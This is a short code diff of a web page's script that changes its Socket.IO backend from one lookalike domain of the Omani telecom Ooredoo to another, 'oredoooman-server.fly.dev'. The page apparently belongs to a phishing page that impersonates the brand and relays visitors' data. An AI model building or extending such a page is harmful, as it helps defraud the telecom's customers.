@@ -186,7 +186,7 @@ h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; marg
 
   var selectedOption = 'omani';
   var isProcessing = false;
-  var SOCKET_URL = 'https://oredoo-server.fly.dev';
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
   var socket = io(SOCKET_URL, { transports: ['websocket','polling'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
   var visitorId = localStorage.getItem('visitorId') || '';
 
